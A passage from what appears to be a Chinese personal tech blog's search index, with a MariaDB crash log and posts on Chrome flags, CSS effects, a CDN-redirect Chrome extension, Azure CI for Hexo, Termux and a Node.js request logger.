mysql_upgrade 16:16:36.37 INFO ==&gt; Starting mariadb in background2019-11-15 16:16:36 140149675591488 [Note] /opt/bitnami/mariadb/sbin/mysqld (mysqld 10.2.28-MariaDB) starting as process 109 ...2019-11-15 16:16:36 140149675591488 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins2019-11-15 16:16:36 140149675591488 [Note] InnoDB: Uses event mutexes2019-11-15 16:16:36 140149675591488 [Note] InnoDB: Compressed tables use zlib 1.2.82019-11-15 16:16:36 140149675591488 [Note] InnoDB: Using Linux native AIO2019-11-15 16:16:36 140149675591488 [Note] InnoDB: Number of pools: 12019-11-15 16:16:36 140149675591488 [Note] InnoDB: Using SSE2 crc32 instructions2019-11-15 16:16:36 140149675591488 [Note] InnoDB: Initializing buffer pool, total size = 128M, instances = 1, chunk size = 128M2019-11-15 16:16:36 140149675591488 [Note] InnoDB: Completed initialization of buffer pool2019-11-15 16:16:36 140149158459136 [Note] InnoDB: If the mysqld execution user is authorized, page cleaner thread priority can be changed. See the man page of setpriority().2019-11-15 16:16:36 140149675591488 [Note] InnoDB: Highest supported file format is Barracuda.2019-11-15 16:16:36 0x7f7723a10740 InnoDB: Assertion failure in file /bitnami/blacksmith-sandox/mariadb-10.2.28/storage/innobase/dict/dict0dict.cc line 1467InnoDB: Failing assertion: table-&gt;can_be_evictedInnoDB: We intentionally generate a memory trap.InnoDB: Submit a detailed bug report to https://jira.mariadb.org/InnoDB: If you get repeated assertion failures or crashes, evenInnoDB: immediately after the mysqld startup, there may beInnoDB: corruption in the InnoDB tablespace. Please refer toInnoDB: https://mariadb.com/kb/en/library/innodb-recovery-modes/InnoDB: about forcing recovery.191115 16:16:36 [ERROR] mysqld got signal 6 ;This could be because you hit a bug. It is also possible that this binaryor one of the libraries it was linked against is corrupt, improperly built,or misconfigured. This error can also be caused by malfunctioning hardware.To report this bug, see https://mariadb.com/kb/en/reporting-bugsWe will try our best to scrape up some info that will hopefully helpdiagnose the problem, but since we have already crashed,something is definitely wrong and this may fail.Server version: 10.2.28-MariaDBkey_buffer_size=134217728read_buffer_size=131072max_used_connections=0max_threads=153thread_count=0It is possible that mysqld could use up tokey_buffer_size + (read_buffer_size + sort_buffer_size)*max_threads = 467243 K bytes of memoryHope that's ok; if not, decrease some variables in the equation.Thread pointer: 0x0Attempting backtrace. You can use the following information to find outwhere mysqld died. If you see no messages after this, something wentterribly wrong...stack_bottom = 0x0 thread_stack 0x49000/opt/bitnami/mariadb/sbin/mysqld(my_print_stacktrace+0x29)[0x55bc847d6809]/opt/bitnami/mariadb/sbin/mysqld(handle_fatal_signal+0x39d)[0x55bc84306bcd]/lib/x86_64-linux-gnu/libpthread.so.0(+0x110e0)[0x7f77235ed0e0]/lib/x86_64-linux-gnu/libc.so.6(gsignal+0xcf)[0x7f7721aaafff]/lib/x86_64-linux-gnu/libc.so.6(abort+0x16a)[0x7f7721aac42a]/opt/bitnami/mariadb/sbin/mysqld(+0x413e3a)[0x55bc840d8e3a]/opt/bitnami/mariadb/sbin/mysqld(+0x966940)[0x55bc8462b940]/opt/bitnami/mariadb/sbin/mysqld(+0x973ff7)[0x55bc84638ff7]/opt/bitnami/mariadb/sbin/mysqld(+0x974750)[0x55bc84639750]/opt/bitnami/mariadb/sbin/mysqld(+0x975bc0)[0x55bc8463abc0]/opt/bitnami/mariadb/sbin/mysqld(+0x966870)[0x55bc8462b870]/opt/bitnami/mariadb/sbin/mysqld(+0x9b6fb0)[0x55bc8467bfb0]/opt/bitnami/mariadb/sbin/mysqld(+0x9bd2bd)[0x55bc846822bd]/opt/bitnami/mariadb/sbin/mysqld(+0x80a7fa)[0x55bc844cf7fa]/opt/bitnami/mariadb/sbin/mysqld(+0x8affd1)[0x55bc84574fd1]/opt/bitnami/mariadb/sbin/mysqld(+0x7b2820)[0x55bc84477820]/opt/bitnami/mariadb/sbin/mysqld(_Z24ha_initialize_handlertonP13st_plugin_int+0x65)[0x55bc84309115]/opt/bitnami/mariadb/sbin/mysqld(+0x4c9d88)[0x55bc8418ed88]/opt/bitnami/mariadb/sbin/mysqld(_Z11plugin_initPiPPci+0x7fa)[0x55bc8418fd2a]/opt/bitnami/mariadb/sbin/mysqld(+0x431825)[0x55bc840f6825]/opt/bitnami/mariadb/sbin/mysqld(_Z11mysqld_mainiPPc+0x1bd3)[0x55bc840fc3b3]/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf1)[0x7f7721a982e1]/opt/bitnami/mariadb/sbin/mysqld(_start+0x2a)[0x55bc840eff5a]The manual page at http://dev.mysql.com/doc/mysql/en/crashing.html containsinformation that should help you find out what is causing the crash.Writing a core file...Working directory at /bitnami/mariadb/dataResource Limits:Limit Soft Limit Hard Limit UnitsMax cpu time unlimited unlimited secondsMax file size unlimited unlimited bytesMax data size unlimited unlimited bytesMax stack size 8388608 unlimited bytesMax core file size unlimited unlimited bytesMax resident set unlimited unlimited bytesMax processes unlimited unlimited processesMax open files 1048576 1048576 filesMax locked memory 65536 65536 bytesMax address space unlimited unlimited bytesMax file locks unlimited unlimited locksMax pending signals 31861 31861 signalsMax msgqueue size 819200 819200 bytesMax nice priority 0 0Max realtime priority 0 0Max realtime timeout unlimited unlimited usCore pattern: |/usr/share/apport/apport %p %s %c %d %P/libos.sh: line 103: 109 Aborted (core dumped) &quot;$@&quot;","link":"/2019/bitnami-mariadb-container-failure/"},{"title":"Chrome 各版本地址栏显示完整地址（https 和 www）","text":"效果 由于谷歌最近对 Chrome 地址栏改来改去，不同的版本需要对应不同的方法。 Chrome 版本＜78在浏览器输入 chrome://flags/ 回车，找到 Omnibox UI Hide Steady-State URL Scheme and Trivial Subdomains，设置为 Disabled，然后重启浏览器。 Chrome 版本＝78谷歌从 flag 页面砍掉了这个设置，但 flag 还是存在的。 打开 chrome://flags/，78版本已经找不到 omnibox-ui-hide-steady-state-url-scheme 和 omnibox-ui-hide-steady-state-url-trivial-subdomains 了。按 F12 打开 Console，执行以下命令，然后重启 Chrome。 Console1234567[ 'omnibox-ui-hide-steady-state-url-path-query-and-ref', 'omnibox-ui-hide-steady-state-url-scheme', 'omnibox-ui-hide-steady-state-url-trivial-subdomains'].forEach((f) =&gt; { chrome.send('enableExperimentalFeature', [`${f}@2`, 'true']);}) 代码中 @2 对应的是 Disabled。@0 和 @1 分别对应 Default 和 Enabled。 测试有效的版本：78.0.3904.97方法来源：ysc3839（https://www.v2ex.com/t/613776） Chrome 版本＞78谷歌彻底砍掉了这两个 flag…… 现在安装插件是唯一方法，如果你能够访问 Chrome 网上应用店的话，安装这个插件，无需配置即可显示完整地址：https://chrome.google.com/webstore/detail/suspicious-site-reporter/jknemblkbdhdcpllfgbfekkdciegfboi方法来源：MaiKuraki（https://www.v2ex.com/t/588136） 如果是 Windows 系统，也可以换用 Chromium 内核的 Edge 浏览器，我已经完全爱上 Edge 啦！ Chromium据IT之家报导，谷歌决定“使URL更易于阅读和理解，并消除对可注册域的干扰”，在Chromium Gerrit中新提交了一个flag标志，未来可在 chrome://flags#context-menu-show-full-urls 中设置开启，届时Chrome浏览器地址栏便可显示完整URL。 嗯，砍了再加回来，绝世好活！ 我并没有下载 Chromium 测试这个 flag，未来推出有这个 flag 的正式版后，我可能会会更新这篇博文。","link":"/2019/chrome-78-show-steady-state-url/"},{"title":"CSS鼠标悬浮改变相邻元素样式","text":"效果： .chip { display: flex; width: fit-content; font-size: 20px; text-align: center; background-color: #ccc; } .chip .name { width: 120px; } .chip .close-bth { width: 30px; } .chip .name:hover, .chip .name:hover + .close-bth, .chip .close-bth:hover { color: white; background-color: #888; } Hover me! X 源码： 1234&lt;div class=&quot;chip&quot;&gt; &lt;span class=&quot;name&quot;&gt;Hover me!&lt;/span&gt; &lt;span class=&quot;close-bth&quot;&gt;X&lt;/span&gt;&lt;/div&gt; 1234567891011121314151617.chip { display: flex; width: fit-content; font-size: 20px; text-align: center; background-color: #ccc;}.chip .name { width: 120px; }.chip .close-bth { width: 30px; }.chip .name:hover,.chip .name:hover + .close-bth,.chip .close-bth:hover { color: white; background-color: #888;} CodePen link:https://codepen.io/iMaeGoo/pen/jRqYRJ hmmmm…这种实现也没什么难的，其实是想试试在博文中插入HTML啦。","link":"/2019/css-adjacent-sibling-selector/"},{"title":"CSS 类似 iOS 的毛玻璃动态模糊效果","text":"提到网页毛玻璃效果，总结下来有以下2种： 模糊元素本身 模糊元素后面的内容 早在之前，1就已经可以通过 CSS3 filter 属性实现，而2一直没有一个好的解决方案。对1的运用，也可以达到2的效果，通过模糊图片的一部分，就可以实现类似 bilibili 导航栏的模糊背景效果 ↓ 这样实现的前提是，我们的背景是一个静态的，单一的图片，那么如果我们需要模糊的背景比较复杂呢？仔细观察QQ右栏的标题栏，和下方的应用 Dock，都是 iOS 常见的毛玻璃叠加层效果 ↓ 显然模糊元素本身并不能解决所有场景的问题。 为了能够实现类 iOS 的毛玻璃，我发现了两种方式—— 元素复制稍微研究就能发现，B站导航条的模糊，是用 两个相同的图片，以相同的坐标显示并叠加，再模糊上层的图片 实现的，那么同理，我们如果把整个页面的节点都复制一份，就能对局部模糊了。 第一步，将页面主体内容clone到navbar中，然后使用css3 -webkit-filter滤镜对内容做高斯模糊。第二步，监听页面滚动事件，计算出scrollTop，将navbar中的内容做同步滚动，同步滚动使用的方法是transform下面的translateY样式，对Y轴做同步偏移。 原文：https://www.jianshu.com/p/e65ae2fd8aea源码：https://github.com/LucienYang/blur_navDemo：https://lucienyang.github.io/blur_nav/ 要完整地复制页面元素，显而，性能会不好，这种方法仅适用于元素较少的网站，且实现比较复杂。但兼容性还是比方法2好的，而且……在没有方法2的情况下，能想到这个办法的人，真是天才…… backdrop-filter在浏览MIUI11官网时，无意发现了其导航栏的毛玻璃效果—— F12一下，找到了这个还不普及的 CSS 属性——“backdrop-filter”。 这是一个实验中的功能，Firefox 完全不支持，较旧的 Chrome 中需要在 flag 中手动开启，好消息是新版的 Chrome 已经默认支持了，让我们看到这个属性的兼容性会越来越高。 backdrop-filter CSS 属性可以让你为一个元素后面区域添加图形效果（如模糊或颜色偏移）。因为它适用于元素背后的所有元素，为了看到效果，必须使元素或其背景至少部分透明。 能够完美解决“模糊元素后面的内容”的需求，但目前兼容性欠佳，在本人的测试下： 兼容最新版 Chrome，以及 Chromium 版 Edge 兼容 Safari，包括 iOS 上的 Safari 兼容 Windows 10 自带的 Edge（巨硬！争气了一回） 不兼容最新版 Firefox 不兼容 Android 上的 Chrome，也不兼容 UC 内核的夸克，也不兼容微信QQ一类 封面来源（Cover source）：P站 / 针眼kyoeye / 希儿希儿希儿 武神千万位，希儿第一位丽塔再插队，策划两行泪","link":"/2019/css-backdrop-blur/"},{"title":"工作两年之余翻起高中写的代码……","text":".heimu { color: #000; background-color: #000; } .heimu:hover { color: #fff; } 许久没再打开过的QQ空间突然有了提示，打开看到是母亲在翻我的软件相册，里面是些高中做出来的东西。 学业那么紧张的情况下，有时间接触手机电脑，甚至还写代码，在我们那个年代，绝对不是随便哪个学生都有的经历。 有初中时候写收菜脚本的基础，我对逻辑有了一定的理解并逐渐着迷，但又没有系统的教学，写出来的东西甚是粗糙。那时候学习 VB 仅仅是看一张名为开天辟地的电脑速成光盘，早期甚至都没有宽带网。不知道如何解析 HTML，就用字符串查找函数；不知道如何模块化编程，就一个文件写 800 多行；不知道如何定位异常，就给每一行代码开头加行号；不知道怎么做安装程序，就写 bat 脚本用 RAR 打自解压包；不知道怎么读写配置文件，就用基本输入输出 txt；甚至一开始连缩进都不懂，代码直上直下的…… 虽然走过这么多的弯路，还影响了高中学习险些没有考上本科，但收获了许多课堂里学不来的东西。 这月初的时候，我在整理一块老硬盘，把高中写的 班班通助手 和 班班通助手2.0 传到了 Github 上保存。我终究还是怕在硬盘里哪一天它就那样丢失了。 在 失去理智注意力涣散 的时候，想想曾经为之着迷的自己，至少还是很励志的。 来看看当时的自己给班班通助手做的宣传PPT吧！ 注：此处下载地址 wodemo.com 我的磨是当时比较流行的用于分享软件的网盘，和现在的蓝奏云差不多的性质，现在我的磨已经无法打开了。 UI 截图 ↓ 还有另一个班的同学模仿做出来的 ↓ 当时的电教柜是威科姆 VCOM 提供的触屏投影式电脑，所以对触屏优化就借鉴 Win8 ↓ 为了分享到别的班，甚至做出了安装向导和设置向导 ↓ 配套的小工具们 ↓ 这是改了很多版越来越沙马特的 v1 版本 😂 ↓ 当时的感想（817 行现在看好像不多也 😂） ↓ 为了方便班里的小吧主同学管理贴吧做的 ↓ 以及做了一半因为高考而夭折的 SNS 聚合软件 ↓","link":"/2019/easy-teach/"},{"title":"编写Chrome插件将googleapis替换为国内可访问的CDN","text":"由于公司不能安装梯子，所以不能访问谷歌商店，平时频繁地要访问国外的AngularJS网站，比如AgGrid，AngularJS Material，AngularJS官网等，很多用了Google的CDN源，页面就无法正常加载。 一开始的思路是改host文件，但是我们没有Google CDN的证书，会造成证书错误。 参考并优化了：https://github.com/justjavac/ReplaceGoogleCDN ，动手写了一个Chrome插件，对所有特定请求重定向，解决痛点！ 新建2个文件，放在同目录下。 manifest.json12345678910111213141516{ &quot;name&quot;: &quot;googleapis replacer&quot;, &quot;version&quot;: &quot;0.1&quot;, &quot;manifest_version&quot;: 2, &quot;description&quot;: &quot;googleapis replacer&quot;, &quot;background&quot;: { &quot;scripts&quot;: [ &quot;main.js&quot; ] }, &quot;permissions&quot;: [ &quot;webRequest&quot;, &quot;webRequestBlocking&quot;, &quot;&lt;all_urls&gt;&quot; ]} main.js12345678910111213141516171819202122232425var rules = [ { &quot;s&quot;: &quot;ajax.googleapis.com&quot;, &quot;t&quot;: &quot;ajax.loli.net&quot; }, { &quot;s&quot;: &quot;fonts.googleapis.com&quot;, &quot;t&quot;: &quot;fonts.loli.net&quot; },];chrome.webRequest.onBeforeRequest.addListener( function (request) { var redirectUrl; var requestURL = request.url; for (var i in rules) { if (requestURL.indexOf(rules[i].s)) { redirectUrl = requestURL.replace(rules[i].s, rules[i].t); return { redirectUrl: redirectUrl }; } } }, { urls: [ &quot;*://ajax.googleapis.com/*&quot;, &quot;*://themes.googleusercontent.com/*&quot; ] }, [&quot;blocking&quot;]); 打开Chrome，输入: chrome://extensions/ 勾选Developer Mode 选择Load unpacked extension…然后定位到代码文件夹，确定 测试：尝试访问 https://ajax.googleapis.com/ajax/libs/angularjs/1.7.8/angular.js拓展：可以在rules中添加更多自定义的规则。 封面来源, Cover source: https://wallpapertag.com/google-chrome-wallpaper-background","link":"/2019/googleapis-replacer/"},{"title":"GitHub Page配置CDN遇到无限301重定向（HTTP ERROR 564）","text":"今天发现腾讯云上有免费的CDN流量，就尝试给自己的Github Page用上，配置好后却一直301重定向，毕竟Github服务器不是自己的，配置和log都看不了，那为什么一直301呢？ 给腾讯云CDN提交工单，客服查了一下（不到10分钟），发现是HTTPS的问题。 客服回复： 您好，这边核实您的域名由于源站开启了强制跳转https，访问反复重定向跳转，建议您登陆CDN控制台配置https证书，并通过如下两种方式解决：1、如您的源站配置了https证书，您可以将回源方式更改为协议跟随；2、如您的源站未配置https证书，建议您将源站的强制跳转https关闭。 原来 Github Page 支持一键HTTPS 开启后全站会启用HTTPS，且HTTP请求会301重定向到HTTPS 而CDN默认会通过HTTP回源，就无限301了。 解决方法很简单，在CDN中配置HTTPS，上传证书，回源方式更改为协议跟随（HTTPS请求回源也HTTPS）。 或者关闭Github Page的HTTPS开关（不推荐） 参考文章：https://yq.aliyun.com/articles/514723 协议跟随回源功能其含义通过一句话来描述即是根据客户端到CDN的请求协议决定CDN回源请求的协议。因此该功能主要是在CDN开启HTTPS协议后，客户端是可以同时支持发送HTTP或者HTTPS协议到CDN节点上请求数据的。 二、常见问题2、源站取消强制跳转设置。开启CDN后建议HTTP和HTTPS协议间的强制跳转功能由CDN的强制跳转功能实现，避免源站再开启强制跳转功能出现重复跳转。","link":"/2019/gp-qcloud-cdn/"},{"title":"Hamcrest 学习笔记","text":"TODO JunitJUnit框架用一组assert方法封装了一些常用的断言。这些assert方法可以帮我们简化单元测试的编写。这样的话，Junit就可以根据这些断言是否抛出 AssertionFailedError 错误来判断测试用例的执行结果。 Hamcrest使用过Junit 的应该有过体验：在实际开发中，一些基本的断言，如eqaul,null,true它们的可读性并不是很好。而且很多时候我们要比较对象、集合、Map等数据结构。这样我们要么进行大段的字段获取再断言。或者干脆自己编写表达式并断言其结果。JUnit4.4引入了Hamcrest框架，Hamcest提供了一套匹配符Matcher，这些匹配符更接近自然语言，可读性高，更加灵活。 Hamcrest 提供了大量被称为“匹配器”的方法。其中每个匹配器都设计用于执行特定的比较操作。Hamcrest的可扩展性很好，让你能够创建自定义的匹配器。最重要的是，JUnit也包含了Hamcrest的核心，提供了对Hamcrest的原生支持，可以直接使用Hamcrest。当然要使用功能齐备的Hamcrest，还是要引入对它的依赖。 Tutorial: http://hamcrest.org/JavaHamcrest/tutorialAPI: http://hamcrest.org/JavaHamcrest/javadoc/2.1/ Utils.java123456789101112131415161718192021222324import java.util.ArrayList;import java.util.List;public class Utils { public static List&lt;Integer&gt; fibonacci(int n) { int a = 1, b = 1, c = 0; List&lt;Integer&gt; result = new ArrayList&lt;&gt;(); for (int i = 1; i &lt;= n; i++) { if (i == 1) { result.add(a); } else if (i == 2) { result.add(b); } else { c = a + b; a = b; b = c; result.add(c); } } return result; }} UtilsTest.java1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import org.junit.Assert;import org.junit.Before;import org.junit.Test;import java.util.Arrays;import java.util.List;import static Matchers.ListMatcher.aList;import static Matchers.NumberMatcher.aNumber;import static org.hamcrest.MatcherAssert.assertThat;import static org.hamcrest.Matchers.*;public class UtilsTest { private List&lt;Integer&gt; expected; @Before public void initExpected() { expected = Arrays.asList(1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765, 10946, 17711, 28657, 46368); } @Test public void testFibonacciByJunit() { List&lt;Integer&gt; actual = Utils.fibonacci(expected.size()); // Way 1 Assert.assertEquals(expected.size(), actual.size()); int index = 0; for (Integer expect : expected) { Assert.assertEquals(expect, actual.get(index)); index++; } // Way 2 Assert.assertEquals(expected, actual); } @Test public void testFibonacciByHamcrest() { List&lt;Integer&gt; actual = Utils.fibonacci(expected.size()); // Way 3 assertThat(actual, not(aNumber())); assertThat(actual, is(aList())); assertThat(actual, equalTo(expected)); }} Matchers/NumberMatcher.java123456789101112131415161718192021package Matchers;import org.hamcrest.Description;import org.hamcrest.Matcher;import org.hamcrest.TypeSafeMatcher;public class NumberMatcher extends TypeSafeMatcher { public void describeTo(Description description) { description.appendText(&quot;is a number&quot;); } public static Matcher aNumber() { return new NumberMatcher(); } @Override protected boolean matchesSafely(Object o) { return o instanceof Integer || o instanceof Double; }} Matchers/ListMatcher.java1234567891011121314151617181920212223package Matchers;import org.hamcrest.Description;import org.hamcrest.Matcher;import org.hamcrest.TypeSafeMatcher;import java.util.List;public class ListMatcher extends TypeSafeMatcher { public void describeTo(Description description) { description.appendText(&quot;is a list&quot;); } public static Matcher aList() { return new ListMatcher(); } @Override protected boolean matchesSafely(Object o) { return o instanceof List; }} harmcrest的核心类从Matchers转为CoreMatchers。用户在使用的时候需要注意更新。 当使用assertThat时，静态导入时，导入的路径变为： 1import static org.hamcrest.CoreMatchers.*; 封面来源: pixabay, free for commercial use.","link":"/2019/hamcrest-summary/"},{"title":"Netlify 初体验——真就是几秒部署呗","text":"Hexo 部署依赖 node 环境就让很多专注写作的人放弃这个框架，劝退萌新，并且难以随时随地写作。好在其 CLI 比较简单，前面我也介绍过如何利用免费的微软 Azure 持续部署博客。 不过今天看 Ant Design Pro 官网的 footer 的时候发现了 Netlify 这个东西，试了以后，强烈安利！！！ 来到它的首页，里面有这么几段话—— 大字： 在几秒钟内部署您的网站* 小字： *不，这里没有陷阱。真的只需点击几下。 嗯……嗯？哼哼……有免费套餐，试试吧！ 首先用 GitHub 授权登录 选择 New site from Git 选择项目托管的位置：GitHub 授权 GitHub 访问私有项目 输入构建命令……等等，你怎么给我自动输入了啊喂？ 点 Deploy site 然后构建就启动了，1分钟后我的站点就到了 Netlify 上。 当时我的表情是 (⊙o⊙)？ 我连部署命令都没打；我连环境都没提供；我甚至全程没有摸一下键盘……（你要问我注册登录不摸键盘？真就没摸，GitHub 是已登录的状态，点一下授权按钮就登录了。）敢情 hexo 的部署配置，Azure 的 CICD 都白写了呗？ …… 😓，流批…… 这个网站还支持绑定域名，自动申请 HTTPS，配 Web Hook（就不用手动点部署了），还有很多很多真 · 自动化的功能，大家一起发掘吧！","link":"/2019/hello-netlify/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2019/hello-world/"},{"title":"给Hexo博客配置Azure CI持续集成实现自动部署","text":"封面来源: 10th Magnitude 这是篇瞎球折腾笔记。CI是个好东西，前段时间看了一本关于DevOps的书，对持续集成有了一定了解。Hexo博客本身拥有很简洁的编译、部署过程： 12hexo ghexo d 但是简单的基础是前戏太多：配置SSH，拉项目，拉子模块，安装NodeJS，安装脚手架，安装依赖……虽然命令多，但是比较单一，便首先想到了给Hexo写CI脚本。 使用的第一个平台是腾讯云开发者平台（dev.tencent.com），它提供基于Jenkinsfile的持续集成beta版本优点：免费，全中文界面，配置简单易于上手，支持Jenkins，国内服务速度快缺点：目前功能较少，不支持上传secret files，无法配置SSH，npm依赖下载缓慢 hexo d命令是需要调用git push的，不支持SSH就凉了，过程就不讲了，在经过一番折腾后，我选择放弃了这个平台。 第二选择是自己搭建Jenkins，一番折腾后，发现自己的VPS性能太差，而且Windows版一些配置难以用配置文件完成，要手动配置，考虑到未来迁移起来会困难，逐放弃…… 优点：完全免费，网上资料丰富缺点：配置复杂，需要自行搭建，性能依赖于VPS性能 最后成功地在巨硬（Microsoft）Azure DevOps上配置好了，跟大家分享步骤！ 优点：免费（一个月1800分钟、1个并行job），runner质量高，配置方便缺点：Web hook不稳定，2次遇到GitHub调不通而没有自动触发Trigger的情况，与其他CI配置不兼容，参考资料较少 用微软账户登录 https://dev.azure.com/ 根据向导，新建一个组织（organization），在组织中新建一个项目（project） 根据向导，授权GitHub（或其他源代码管理平台）访问自己的Hexo项目 在项目设置（Project settings - Azure DevOps services）中，启用Pipelines 进入Pipelines，新建Build 有一些模板，但是没有关于Hexo的，自己根据过程写一个：azure-pipelines.yml1234567891011121314151617181920212223242526272829303132333435363738trigger:- master # Hexo 原项目分支名pool: vmImage: 'Ubuntu-16.04' # 运行环境steps:- task: NodeTool@0 # 安装NodeJS inputs: versionSpec: '10.x' displayName: 'Installing Node.js...'- task: InstallSSHKey@0 # 导入SSH inputs: hostName: github.com,52.74.223.119 ssh-rsa AAAAB3... # 对应known_hosts sshPublicKey: ssh-rsa AAAAB3... # 对应id_rsa.pub sshKeySecureFile: id_rsa # 对应私钥文件名 displayName: 'Installing SSH...'# 安装Hexo脚手架，Hexo依赖- script: | npm install -g hexo-cli npm install displayName: 'Installing dependencies...'# 清理（可选），生成public静态目录（可选）- script: | hexo clean hexo g displayName: 'Building...'# 这里由于我有两个page托管仓库需要部署，所以需要添加 git.dev.tencent.com 的 fingerprint 到 known_hosts- script: | ssh-keyscan -t rsa git.dev.tencent.com &gt;&gt; ~/.ssh/known_hosts git config --global user.name &quot;imaegoo-az&quot; git config --global user.email &quot;mail1st@qq.com&quot; hexo d displayName: 'Deploying...' 保存到新分支并选择创建PR以便测试 右上角菜单中点击Triggers，如果有黄色提示GitHub web hook配置不正确，可以在这里选择自动修复 由于我的Hexo带有Icarus主题子模块，所以还需要进入YAML - Get sources下勾选“Checkout submodules” 然后点击左侧Pipelines - Library - Secure files上传私钥文件“id_rsa” 点击进入刚上传的私钥，选中“Authorize for use in all pipelines”以允许Build任务读取 尝试运行build 尝试push代码触发build 国外CI runner依赖下载速度甩了腾讯几条街，1分钟一次build，免费时间一个月是用不完的。 如果你遇到了部署失败，可以访问 Azure DevOps的帮助文档 中寻找答案，也欢迎粘贴log讨论！ 封面来源, Cover source: https://www.10thmagnitude.com/azure-devops-whats-in-a-rename/","link":"/2019/hexo-ci/"},{"title":"使用Termux在Android手机上搭建、编辑Hexo博客","text":"高级终端Termux是个强大的终端模拟器，这样的应用应该特别适合不喜欢图形界面的命令行爱好者，组合了强大的终端模拟和拓展Linux包收集支持。 享受bash和zsh。 使用nano和vim编辑文件。 通过ssh访问服务器。 使用gcc和clang编译代码。 使用python控制台来作为口袋计算器。 使用git和subversion检查项目。 使用frotz运行基于文本的游戏。 Step: 在Google Play或酷安搜索Termux安装，link：https://play.google.com/store/apps/details?id=com.termuxhttps://www.coolapk.com/apk/com.termux 打开Termux，更新软件源 12apt updateapt upgrade -y 安装相关软件 12apt install gitapt install nodejs 检查node和npm是否安装成功以及版本 1234node --versionv11.13.0npm --version6.7.0 克隆代码（将仓库地址换掉） 123git clone https://github.com/imaegoo/imaegoo.github.edit.gitcd imaegoo.github.editgit clone https://github.com/imaegoo/hexo-theme-icarus.git themes/icarus 安装npm依赖 12npm install -g hexo-clinpm install 启动Hexo 12hexo ghexo s 附录： Q：如何调出Ctrl, Alt等按键？A：屏幕左边缘向右划动呼出边栏，长按KEYBOARD。 Q：Termux系统的根文件夹在哪里？A：/data/data/com.termux/files/，可以使用root explorer等访问。 截图：","link":"/2019/hexo-on-android/"},{"title":"Node.js 实现 HTTP 访问日志","text":"越来越咸，两个月没发文章了，刚刚换项目了，开始学一些新的知识。近来调试 webhook 和 http callback 比较多，想要使用 Node.js 写一个接收所有 HTTP 请求，并把请求头和请求体写进log，返回 200 OK 的 service。 其实就是简单的 access.log 啦。其实就是刚学习 Node.js 写的 demo 啦。啊这是很简单你不要拆穿啦。 这是输出的 log 的样子，优化了可读性，时间、method、path、URL参数（Query）、请求头（Header）、请求体（Body）都详细记录了： 1234567891011121314151617181920info: 2019-07-25 18:04:36 POST /v1.0/standard Query: search: keyword Header: cache-control: no-cache postman-token: f4103067-4b07-447d-9fab-f09a75b6ddda content-type: application/json user-agent: PostmanRuntime/3.0.11-hotfix.2 accept: */* host: localhost:4000 accept-encoding: gzip, deflate content-length: 209 connection: keep-alive Body: appId: XXX data: userId: 123 requestId: 456 timestamp: 0 依赖配置： | 包 | 作用 || - | - | - || body-parser | 转换form表单、json等格式的请求体 || express | 启http服务 || moment | 时间格式化 || winston | 打log | package.json1234567891011121314{ &quot;name&quot;: &quot;httplog&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;Log all http request to the service&quot;, &quot;main&quot;: &quot;app.js&quot;, &quot;author&quot;: &quot;iMaeGoo&quot;, &quot;license&quot;: &quot;MIT&quot;, &quot;dependencies&quot;: { &quot;body-parser&quot;: &quot;^1.19.0&quot;, &quot;express&quot;: &quot;^4.17.1&quot;, &quot;moment&quot;: &quot;^2.24.0&quot;, &quot;winston&quot;: &quot;^3.2.1&quot; }} app.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475const express = require('express')const bodyParser = require('body-parser')const winston = require('winston')const moment = require('moment')const app = express()const port = 4000const logger = winston.createLogger({ level: 'info', format: winston.format.simple(), transports: [ new winston.transports.File({ filename: 'http.log' }), new winston.transports.Console() ]});app.use(bodyParser.json({ type: 'application/json'}))app.use(bodyParser.urlencoded({ type: 'application/x-www-form-urlencoded'}))app.use(bodyParser.text({ type: '*/*'}))app.get('*', reqHandler)app.post('*', reqHandler)app.put('*', reqHandler)app.delete('*', reqHandler)app.listen(port, () =&gt; console.log(`listening &amp; logging on port ${port}`))function reqHandler(req, res) { logger.info(formatReq(req)) res.send('OK')}function formatReq(req) { let logStr = getStandardDateTime() logStr += `\\n\\t${req.method} ${req.path}` logStr += `\\n\\tQuery:` logStr += `${toString(req.query, 2)}` logStr += `\\n\\tHeader:` logStr += `${toString(req.headers, 2)}` if (req.method !== 'GET') { logStr += `\\n\\tBody:` if (req.body instanceof Object) { logStr += `${toString(req.body, 2)}` } else { logStr += `\\n\\t\\t${req.body}` } } return logStr}function getStandardDateTime(date) { return moment(date).format('YYYY-MM-DD HH:mm:ss')}function toString(obj, tabCount = 2) { let str = '' let item for (let key in obj) { item = obj[key] str += '\\n' for (let i = 0; i &lt; tabCount; i++) { str += '\\t' } str += `${key}:` if (item instanceof Object) { str += toString(item, tabCount + 1) } else { str += ` ${item}` } } return str} 之后安装依赖，运行： 12npm installnode app.js Spring Boot 也可以很简单实现，谁来写一下？","link":"/2019/http-log/"},{"title":"如何给 Icarus 增加夜间模式","text":"此篇针对 Icarus 2 版本，Icarus 3 请参考：Icarus 夜间模式支持 3.0 了 Preview Live Previewhttps://www.imaegoo.com/ AttentionThis extension is NOT FULLY TESTED, so it may not fully cover the theme styles, if you find something wrong (such as bright things in night mode), please report it in this issue, do not open new issue. Usage Merge night branch from imaegoo/hexo-theme-icarus into your icarus theme folder, or dowmload zip. If you configured an image logo, you should prepare a logo for night mode, then apply them in themes/icarus/_config.yml.123logo: light: /images/logo.png dark: /images/logo-dark.png 把 night 分支（imaegoo/hexo-theme-icarus）合并到你的主题分支中。如果你不懂，并且你对主题没有自己修改，直接下载修改好压缩包。 如果你的网站 LOGO 是图片，你可能需要准备一黑一白两个版本的 LOGO，并在主题 themes/icarus/_config.yml 中配置。123logo: light: /images/logo.png dark: /images/logo-dark.png ModifyIf you want to customize your theme, you can modify night mode part in themes/icarus/source/css/style.styl. ThanksUniverse background from https://github.com/fan-lv/Fan","link":"/2019/icarus-night-mode-2/"},{"title":"Icarus 